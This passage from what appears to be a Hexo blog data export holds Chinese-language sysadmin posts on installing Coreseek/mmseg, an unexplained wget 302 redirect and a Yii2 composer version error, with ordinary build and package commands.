--with-mmseg-libs=/server/mmseg-3.2.14/lib\nmake &amp;&amp; make install\n```\n-------------------- 安装完成 ---------------\n\n创建索引数据与日志的目录：\n```\nmkdir /alidata/coreseek\nmkdir /alidata/coreseek/index\nmkdir /alidata/coreseek/log\n```\n&nbsp;\n\n&nbsp;\n\n添加配置文件\n```\n# 从 xueba-tiku 仓库中提取sphinx的配置文件\n\nln -s /home/pxk/www/xueba-tiku/protected/data/sphinx.conf  /server/coreseek-4.1/etc/\n\n# 修改配置 /server/coreseek-4.1/etc/sphinx.conf 中的路径和数据库参数\n\n# 添加词库 （词库在仓库里）\n\n/server/mmseg-3.2.14/bin/mmseg -u /home/pxk/www/xueba-tiku/protected/data/edu.txt\n\n# 添加stopword.txt （忽略词汇）\n\nln -s /home/pxk/www/xueba-tiku/protected/data/stopwords.txt /server/coreseek-4.1/etc/\n```\n&nbsp;\n\n&nbsp;\n\n--------------------------- 配置完成 ---------------------------\n```\n# 创建索引数据\n\n/server/coreseek-4.1/bin/indexer --config /server/coreseek-4.1/etc/sphinx.conf --all\n\n# 启动搜索服务后台进程\n\n/server/coreseek-4.1/bin/searchd --config /server/coreseek-4.1/etc/sphinx.conf\n```\n&nbsp;\n\n&nbsp;","slug":"ubuntu-e5-ae-89-e8-a3-85coreseek4-1","published":1,"updated":"2018-03-05T12:56:25.366Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhwz002zlzlmj2hxxl1v","content":"<p>目录规划：</p>\n<p>此过程将编译两个包， mmseg-3.2.14 和 coreseek-4.1，它们都将包含版本号放置在 /server 下</p>\n<p>索引和日志放在 /alidata/coreseek/ 下</p>\n<p>&nbsp;</p>\n<p>下载源码包，包里集成了coreseek4.1 mmseg3.1.4<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://www.coreseek.cn/uploads/csft/4.0/coreseek-4.1-beta.tar.gz</span><br></pre></td></tr></table></figure></p>\n<p>&nbsp;</p>\n<p>安装libtool (coreseek需要)<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install libtool</span><br></pre></td></tr></table></figure></p>\n<p>&nbsp;</p>\n<p>实际安装: libltdl-dev libltdl7 libtool</p>\n<p>安装mysql开发者包<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install mysql-devel</span><br></pre></td></tr></table></figure></p>\n<p>&nbsp;</p>\n<p>实际安装: libmysqlclient-dev libmysqlclient18 libmysqld-dev mysql-common</p>\n<p>&nbsp;</p>\n<p>安装 mmseg  (源码集成在 coreseek-4.1-beta)<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd  mmseg-3.2.14/</span><br><span class=\"line\"></span><br><span class=\"line\"># 包内自带的编译前初始化工具</span><br><span class=\"line\"></span><br><span class=\"line\">./bootstrap </span><br><span class=\"line\"></span><br><span class=\"line\"># 安装到 /server/mmseg-3.2.14</span><br><span class=\"line\"></span><br><span class=\"line\">./configure --prefix=/server/mmseg-3.2.14</span><br><span class=\"line\"></span><br><span class=\"line\">make &amp;amp;&amp;amp; make install</span><br></pre></td></tr></table></figure></p>\n<p>&nbsp;</p>\n<p>安装 coreseek<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 包内自带的编译前初始化工具</span><br><span class=\"line\">./buildconf.sh</span><br><span class=\"line\">./configure --prefix=/server/coreseek-4.1 --with-mysql --with-mmseg --with-mysql-includes=/usr/include/mysql --with-mmseg-includes=/server/mmseg-3.2.14/include/mmseg --with-mmseg-libs=/server/mmseg-3.2.14/lib</span><br><span class=\"line\">make &amp;amp;&amp;amp; make install</span><br></pre></td></tr></table></figure></p>\n<p>——————– 安装完成 —————</p>\n<p>创建索引数据与日志的目录：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir /alidata/coreseek</span><br><span class=\"line\">mkdir /alidata/coreseek/index</span><br><span class=\"line\">mkdir /alidata/coreseek/log</span><br></pre></td></tr></table></figure></p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>添加配置文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 从 xueba-tiku 仓库中提取sphinx的配置文件</span><br><span class=\"line\"></span><br><span class=\"line\">ln -s /home/pxk/www/xueba-tiku/protected/data/sphinx.conf  /server/coreseek-4.1/etc/</span><br><span class=\"line\"></span><br><span class=\"line\"># 修改配置 /server/coreseek-4.1/etc/sphinx.conf 中的路径和数据库参数</span><br><span class=\"line\"></span><br><span class=\"line\"># 添加词库 （词库在仓库里）</span><br><span class=\"line\"></span><br><span class=\"line\">/server/mmseg-3.2.14/bin/mmseg -u /home/pxk/www/xueba-tiku/protected/data/edu.txt</span><br><span class=\"line\"></span><br><span class=\"line\"># 添加stopword.txt （忽略词汇）</span><br><span class=\"line\"></span><br><span class=\"line\">ln -s /home/pxk/www/xueba-tiku/protected/data/stopwords.txt /server/coreseek-4.1/etc/</span><br></pre></td></tr></table></figure></p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>————————— 配置完成 —————————<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 创建索引数据</span><br><span class=\"line\"></span><br><span class=\"line\">/server/coreseek-4.1/bin/indexer --config /server/coreseek-4.1/etc/sphinx.conf --all</span><br><span class=\"line\"></span><br><span class=\"line\"># 启动搜索服务后台进程</span><br><span class=\"line\"></span><br><span class=\"line\">/server/coreseek-4.1/bin/searchd --config /server/coreseek-4.1/etc/sphinx.conf</span><br></pre></td></tr></table></figure></p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n","site":{"data":{}},"excerpt":"","more":"<p>目录规划：</p>\n<p>此过程将编译两个包， mmseg-3.2.14 和 coreseek-4.1，它们都将包含版本号放置在 /server 下</p>\n<p>索引和日志放在 /alidata/coreseek/ 下</p>\n<p>&nbsp;</p>\n<p>下载源码包，包里集成了coreseek4.1 mmseg3.1.4<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://www.coreseek.cn/uploads/csft/4.0/coreseek-4.1-beta.tar.gz</span><br></pre></td></tr></table></figure></p>\n<p>&nbsp;</p>\n<p>安装libtool (coreseek需要)<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install libtool</span><br></pre></td></tr></table></figure></p>\n<p>&nbsp;</p>\n<p>实际安装: libltdl-dev libltdl7 libtool</p>\n<p>安装mysql开发者包<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install mysql-devel</span><br></pre></td></tr></table></figure></p>\n<p>&nbsp;</p>\n<p>实际安装: libmysqlclient-dev libmysqlclient18 libmysqld-dev mysql-common</p>\n<p>&nbsp;</p>\n<p>安装 mmseg  (源码集成在 coreseek-4.1-beta)<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd  mmseg-3.2.14/</span><br><span class=\"line\"></span><br><span class=\"line\"># 包内自带的编译前初始化工具</span><br><span class=\"line\"></span><br><span class=\"line\">./bootstrap </span><br><span class=\"line\"></span><br><span class=\"line\"># 安装到 /server/mmseg-3.2.14</span><br><span class=\"line\"></span><br><span class=\"line\">./configure --prefix=/server/mmseg-3.2.14</span><br><span class=\"line\"></span><br><span class=\"line\">make &amp;amp;&amp;amp; make install</span><br></pre></td></tr></table></figure></p>\n<p>&nbsp;</p>\n<p>安装 coreseek<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 包内自带的编译前初始化工具</span><br><span class=\"line\">./buildconf.sh</span><br><span class=\"line\">./configure --prefix=/server/coreseek-4.1 --with-mysql --with-mmseg --with-mysql-includes=/usr/include/mysql --with-mmseg-includes=/server/mmseg-3.2.14/include/mmseg --with-mmseg-libs=/server/mmseg-3.2.14/lib</span><br><span class=\"line\">make &amp;amp;&amp;amp; make install</span><br></pre></td></tr></table></figure></p>\n<p>——————– 安装完成 —————</p>\n<p>创建索引数据与日志的目录：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir /alidata/coreseek</span><br><span class=\"line\">mkdir /alidata/coreseek/index</span><br><span class=\"line\">mkdir /alidata/coreseek/log</span><br></pre></td></tr></table></figure></p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>添加配置文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 从 xueba-tiku 仓库中提取sphinx的配置文件</span><br><span class=\"line\"></span><br><span class=\"line\">ln -s /home/pxk/www/xueba-tiku/protected/data/sphinx.conf  /server/coreseek-4.1/etc/</span><br><span class=\"line\"></span><br><span class=\"line\"># 修改配置 /server/coreseek-4.1/etc/sphinx.conf 中的路径和数据库参数</span><br><span class=\"line\"></span><br><span class=\"line\"># 添加词库 （词库在仓库里）</span><br><span class=\"line\"></span><br><span class=\"line\">/server/mmseg-3.2.14/bin/mmseg -u /home/pxk/www/xueba-tiku/protected/data/edu.txt</span><br><span class=\"line\"></span><br><span class=\"line\"># 添加stopword.txt （忽略词汇）</span><br><span class=\"line\"></span><br><span class=\"line\">ln -s /home/pxk/www/xueba-tiku/protected/data/stopwords.txt /server/coreseek-4.1/etc/</span><br></pre></td></tr></table></figure></p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>————————— 配置完成 —————————<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 创建索引数据</span><br><span class=\"line\"></span><br><span class=\"line\">/server/coreseek-4.1/bin/indexer --config /server/coreseek-4.1/etc/sphinx.conf --all</span><br><span class=\"line\"></span><br><span class=\"line\"># 启动搜索服务后台进程</span><br><span class=\"line\"></span><br><span class=\"line\">/server/coreseek-4.1/bin/searchd --config /server/coreseek-4.1/etc/sphinx.conf</span><br></pre></td></tr></table></figure></p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n"},{"title":"wget莫名其妙的跳转","id":"127","date":"2015-07-15T07:34:06.000Z","_content":"\n尝试从自己的服务器下载一些包文件，服务端也正常响应200，但wget却奇怪的收到302跳转请求。\n\n客户端下载的命令\n```\n$ wget http://package.xiaoai.me/php-5.6.10.tar.gz --no-cache --no-dns-cache\n--2015-07-15 15:24:37--  http://package.xiaoai.me/php-5.6.10.tar.gz\n正在解析主机 package.xiaoai.me (package.xiaoai.me)... 104.155.200.103\n正在连接 package.xiaoai.me (package.xiaoai.me)|104.155.200.103|:80... 已连接。\n已发出 HTTP 请求，正在等待回应... 302 Found\n位置：http://124.205.69.137/files/40050000012FFD2C/cn2.php.net/distributions/php-5.6.10.tar.gz [跟随至新的 URL]\n--2015-07-15 15:24:37--  http://124.205.69.137/files/40050000012FFD2C/cn2.php.net/distributions/php-5.6.10.tar.gz\n正在连接 124.205.69.137:80... 已连接。\n已发出 HTTP 请求，正在等待回应... 200 OK\n长度：18306403 (17M) [application/octet-stream]\n正在保存至: “php-5.6.10.tar.gz.2”\n\nphp-5.6.10.tar.gz.2  82%[=================>    ]  14.45M  3.59MB/s   eta 1s    \n\n```\n刚开始没注意，还以为国外的服务器速度这么快，原来是跳转了。\n\n而服务端的nginx的配置，就是一个普通网站\n```\nserver {\n    listen 80;\n    server_name package.xiaoai.me;\n    root /srv/package;\n\n    access_log logs/package.xiaoai.me.access.log;\n\n    location / {\n        index index.html;\n    }\n}\n\n```\nnginx的日志显示的是200，不是302:\n```\nxx.xx.xx.xx - - [15/Jul/2015:15:24:37 +0800] \"GET /php-5.6.10.tar.gz HTTP/1.1\" 200 15488 \"-\" \"Wget/1.16.1 (linux-gnu)\"\n\n```\n&nbsp;\n\n那这个302从哪里来的，未解之迷。暂时记录下，有时间看看","source":"_posts/wget-e8-8e-ab-e5-90-8d-e5-85-b6-e5-a6-99-e7-9a-84-e8-b7-b3-e8-bd-ac.md","raw":"---\ntitle: wget莫名其妙的跳转\nid: 127\ncategories:\n  - linux\ndate: 2015-07-15 15:34:06\ntags:\n---\n\n尝试从自己的服务器下载一些包文件，服务端也正常响应200，但wget却奇怪的收到302跳转请求。\n\n客户端下载的命令\n```\n$ wget http://package.xiaoai.me/php-5.6.10.tar.gz --no-cache --no-dns-cache\n--2015-07-15 15:24:37--  http://package.xiaoai.me/php-5.6.10.tar.gz\n正在解析主机 package.xiaoai.me (package.xiaoai.me)... 104.155.200.103\n正在连接 package.xiaoai.me (package.xiaoai.me)|104.155.200.103|:80... 已连接。\n已发出 HTTP 请求，正在等待回应... 302 Found\n位置：http://124.205.69.137/files/40050000012FFD2C/cn2.php.net/distributions/php-5.6.10.tar.gz [跟随至新的 URL]\n--2015-07-15 15:24:37--  http://124.205.69.137/files/40050000012FFD2C/cn2.php.net/distributions/php-5.6.10.tar.gz\n正在连接 124.205.69.137:80... 已连接。\n已发出 HTTP 请求，正在等待回应... 200 OK\n长度：18306403 (17M) [application/octet-stream]\n正在保存至: “php-5.6.10.tar.gz.2”\n\nphp-5.6.10.tar.gz.2  82%[=================>    ]  14.45M  3.59MB/s   eta 1s    \n\n```\n刚开始没注意，还以为国外的服务器速度这么快，原来是跳转了。\n\n而服务端的nginx的配置，就是一个普通网站\n```\nserver {\n    listen 80;\n    server_name package.xiaoai.me;\n    root /srv/package;\n\n    access_log logs/package.xiaoai.me.access.log;\n\n    location / {\n        index index.html;\n    }\n}\n\n```\nnginx的日志显示的是200，不是302:\n```\nxx.xx.xx.xx - - [15/Jul/2015:15:24:37 +0800] \"GET /php-5.6.10.tar.gz HTTP/1.1\" 200 15488 \"-\" \"Wget/1.16.1 (linux-gnu)\"\n\n```\n&nbsp;\n\n那这个302从哪里来的，未解之迷。暂时记录下，有时间看看","slug":"wget-e8-8e-ab-e5-90-8d-e5-85-b6-e5-a6-99-e7-9a-84-e8-b7-b3-e8-bd-ac","published":1,"updated":"2018-03-05T12:57:36.656Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhx20032lzlm54mptayx","content":"<p>尝试从自己的服务器下载一些包文件，服务端也正常响应200，但wget却奇怪的收到302跳转请求。</p>\n<p>客户端下载的命令<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ wget http://package.xiaoai.me/php-5.6.10.tar.gz --no-cache --no-dns-cache</span><br><span class=\"line\">--2015-07-15 15:24:37--  http://package.xiaoai.me/php-5.6.10.tar.gz</span><br><span class=\"line\">正在解析主机 package.xiaoai.me (package.xiaoai.me)... 104.155.200.103</span><br><span class=\"line\">正在连接 package.xiaoai.me (package.xiaoai.me)|104.155.200.103|:80... 已连接。</span><br><span class=\"line\">已发出 HTTP 请求，正在等待回应... 302 Found</span><br><span class=\"line\">位置：http://124.205.69.137/files/40050000012FFD2C/cn2.php.net/distributions/php-5.6.10.tar.gz [跟随至新的 URL]</span><br><span class=\"line\">--2015-07-15 15:24:37--  http://124.205.69.137/files/40050000012FFD2C/cn2.php.net/distributions/php-5.6.10.tar.gz</span><br><span class=\"line\">正在连接 124.205.69.137:80... 已连接。</span><br><span class=\"line\">已发出 HTTP 请求，正在等待回应... 200 OK</span><br><span class=\"line\">长度：18306403 (17M) [application/octet-stream]</span><br><span class=\"line\">正在保存至: “php-5.6.10.tar.gz.2”</span><br><span class=\"line\"></span><br><span class=\"line\">php-5.6.10.tar.gz.2  82%[=================&gt;    ]  14.45M  3.59MB/s   eta 1s</span><br></pre></td></tr></table></figure></p>\n<p>刚开始没注意，还以为国外的服务器速度这么快，原来是跳转了。</p>\n<p>而服务端的nginx的配置，就是一个普通网站<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen 80;</span><br><span class=\"line\">    server_name package.xiaoai.me;</span><br><span class=\"line\">    root /srv/package;</span><br><span class=\"line\"></span><br><span class=\"line\">    access_log logs/package.xiaoai.me.access.log;</span><br><span class=\"line\"></span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        index index.html;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>nginx的日志显示的是200，不是302:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xx.xx.xx.xx - - [15/Jul/2015:15:24:37 +0800] &quot;GET /php-5.6.10.tar.gz HTTP/1.1&quot; 200 15488 &quot;-&quot; &quot;Wget/1.16.1 (linux-gnu)&quot;</span><br></pre></td></tr></table></figure></p>\n<p>&nbsp;</p>\n<p>那这个302从哪里来的，未解之迷。暂时记录下，有时间看看</p>\n","site":{"data":{}},"excerpt":"","more":"<p>尝试从自己的服务器下载一些包文件，服务端也正常响应200，但wget却奇怪的收到302跳转请求。</p>\n<p>客户端下载的命令<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ wget http://package.xiaoai.me/php-5.6.10.tar.gz --no-cache --no-dns-cache</span><br><span class=\"line\">--2015-07-15 15:24:37--  http://package.xiaoai.me/php-5.6.10.tar.gz</span><br><span class=\"line\">正在解析主机 package.xiaoai.me (package.xiaoai.me)... 104.155.200.103</span><br><span class=\"line\">正在连接 package.xiaoai.me (package.xiaoai.me)|104.155.200.103|:80... 已连接。</span><br><span class=\"line\">已发出 HTTP 请求，正在等待回应... 302 Found</span><br><span class=\"line\">位置：http://124.205.69.137/files/40050000012FFD2C/cn2.php.net/distributions/php-5.6.10.tar.gz [跟随至新的 URL]</span><br><span class=\"line\">--2015-07-15 15:24:37--  http://124.205.69.137/files/40050000012FFD2C/cn2.php.net/distributions/php-5.6.10.tar.gz</span><br><span class=\"line\">正在连接 124.205.69.137:80... 已连接。</span><br><span class=\"line\">已发出 HTTP 请求，正在等待回应... 200 OK</span><br><span class=\"line\">长度：18306403 (17M) [application/octet-stream]</span><br><span class=\"line\">正在保存至: “php-5.6.10.tar.gz.2”</span><br><span class=\"line\"></span><br><span class=\"line\">php-5.6.10.tar.gz.2  82%[=================&gt;    ]  14.45M  3.59MB/s   eta 1s</span><br></pre></td></tr></table></figure></p>\n<p>刚开始没注意，还以为国外的服务器速度这么快，原来是跳转了。</p>\n<p>而服务端的nginx的配置，就是一个普通网站<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen 80;</span><br><span class=\"line\">    server_name package.xiaoai.me;</span><br><span class=\"line\">    root /srv/package;</span><br><span class=\"line\"></span><br><span class=\"line\">    access_log logs/package.xiaoai.me.access.log;</span><br><span class=\"line\"></span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        index index.html;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>nginx的日志显示的是200，不是302:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xx.xx.xx.xx - - [15/Jul/2015:15:24:37 +0800] &quot;GET /php-5.6.10.tar.gz HTTP/1.1&quot; 200 15488 &quot;-&quot; &quot;Wget/1.16.1 (linux-gnu)&quot;</span><br></pre></td></tr></table></figure></p>\n<p>&nbsp;</p>\n<p>那这个302从哪里来的，未解之迷。暂时记录下，有时间看看</p>\n"},{"title":"yii2 composer错误: Invalid version string &quot;2.*&quot;","id":"155","date":"2015-08-02T07:59:57.000Z","_content":"\n在更新或安装yii2时，现在会出现一个composer库的错误：\n```\n$ composer global require \"fxp/composer-asset-plugin:~1.0.0\"\n$ composer create-project --prefer-dist yiisoft/yii2-app-basic basic\nInstalling yiisoft/yii2-app-basic (2.0.4)\n  - Installing yiisoft/yii2-app-basic (2.0.4)\n    Downloading: 100%         \n\nCreated project in basic\nLoading composer repositories with package information\nInstalling dependencies (including require-dev)\n\n  [UnexpectedValueException]                                              \n  Could not parse version constraint <=2.*: Invalid version string \"2.*\"  \n\n\n```\n这是yii2依赖库 **fxp/composer-asset-plugin** 的问题，要解决这个问题，需要升级它。\n\nyii2官网上让我们使用的是 1.0.0版本，现在要使用最新的dev-master版本才行。可以直接运行：\n```\n$ composer.phar global require \"fxp/composer-asset-plugin:1.0.*@dev\"\n```\n它会覆盖掉原先global全局有问题的1.0.0版本配置\n\n然后重新 **composer update** 即可\n\n参考：\n\n[http://stackoverflow.com/questions/31681630/yii2-composer-update-error-invalid-version-string-2](http://stackoverflow.com/questions/31681630/yii2-composer-update-error-invalid-version-string-2)","source":"_posts/yii2-composer-e9-94-99-e8-af-af-invalid-version-string-2.md","raw":"---\ntitle: 'yii2 composer错误: Invalid version string &quot;2.*&quot;'\nid: 155\ncategories:\n  - php\ndate: 2015-08-02 15:59:57\ntags:\n---\n\n在更新或安装yii2时，现在会出现一个composer库的错误：\n```\n$ composer global require \"fxp/composer-asset-plugin:~1.0.0\"\n$ composer create-project --prefer-dist yiisoft/yii2-app-basic basic\nInstalling yiisoft/yii2-app-basic (2.0.4)\n  - Installing yiisoft/yii2-app-basic (2.0.4)\n    Downloading: 100%         \n\nCreated project in basic\nLoading composer repositories with package information\nInstalling dependencies (including require-dev)\n\n  [UnexpectedValueException]                                              \n  Could not parse version constraint <=2.*: Invalid version string \"2.*\"  \n\n\n```\n这是yii2依赖库 **fxp/composer-asset-plugin** 的问题，要解决这个问题，需要升级它。\n\nyii2官网上让我们使用的是 1.0.0版本，现在要使用最新的dev-master版本才行。可以直接运行：\n```\n$ composer.phar global require \"fxp/composer-asset-plugin:1.0.*@dev\"\n```\n它会覆盖掉原先global全局有问题的1.0.0版本配置\n\n然后重新 **composer update** 即可\n\n参考：\n\n[http://stackoverflow.com/questions/31681630/yii2-composer-update-error-invalid-version-string-2](http://stackoverflow.com/questions/31681630/yii2-composer-update-error-invalid-version-string-2)","slug":"yii2-composer-e9-94-99-e8-af-af-invalid-version-string-2","published":1,"updated":"2018-03-05T12:57:51.550Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhx40034lzlmx65uupeo","content":"<p>在更新或安装yii2时，现在会出现一个composer库的错误：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ composer global require &quot;fxp/composer-asset-plugin:~1.0.0&quot;</span><br><span class=\"line\">$ composer create-project --prefer-dist yiisoft/yii2-app-basic basic</span><br><span class=\"line\">Installing yiisoft/yii2-app-basic (2.0.4)</span><br><span class=\"line\">  - Installing yiisoft/yii2-app-basic (2.0.4)</span><br><span class=\"line\">    Downloading: 100%         </span><br><span class=\"line\"></span><br><span class=\"line\">Created project in basic</span><br><span class=\"line\">Loading composer repositories with package information</span><br><span class=\"line\">Installing dependencies (including require-dev)</span><br><span class=\"line\"></span><br><span class=\"line\">  [UnexpectedValueException]                                              </span><br><span class=\"line\">  Could not parse version constraint &lt;=2.*: Invalid version string &quot;2.*&quot;</span><br></pre></td></tr></table></figure></p>\n<p>这是yii2依赖库 <strong>fxp/composer-asset-plugin</strong> 的问题，要解决这个问题，需要升级它。</p>\n<p>yii2官网上让我们使用的是 1.0.0版本，现在要使用最新的dev-master版本才行。可以直接运行：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ composer.phar global require &quot;fxp/composer-asset-plugin:1.0.*@dev&quot;</span><br></pre></td></tr></table></figure></p>\n<p>它会覆盖掉原先global全局有问题的1.0.0版本配置</p>\n<p>然后重新 <strong>composer update</strong> 即可</p>\n<p>参考：</p>\n<p><a href=\"http://stackoverflow.com/questions/31681630/yii2-composer-update-error-invalid-version-string-2\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/31681630/yii2-composer-update-error-invalid-version-string-2</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>在更新或安装yii2时，现在会出现一个composer库的错误：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ composer global require &quot;fxp/composer-asset-plugin:~1.0.0&quot;</span><br><span class=\"line\">$ composer create-project --prefer-dist yiisoft/yii2-app-basic basic</span><br><span class=\"line\">Installing yiisoft/yii2-app-basic (2.0.4)</span><br><span class=\"line\">  - Installing yiisoft/yii2-app-basic (2.0.4)</span><br><span class=\"line\">    Downloading: 100%         </span><br><span class=\"line\"></span><br><span class=\"line\">Created project in basic</span><br><span class=\"line\">Loading composer repositories with package information</span><br><span class=\"line\">Installing dependencies (including require-dev)</span><br><span class=\"line\"></span><br><span class=\"line\">  [UnexpectedValueException]                                              </span><br><span class=\"line\">  Could not parse version constraint &lt;=2.*: Invalid version string 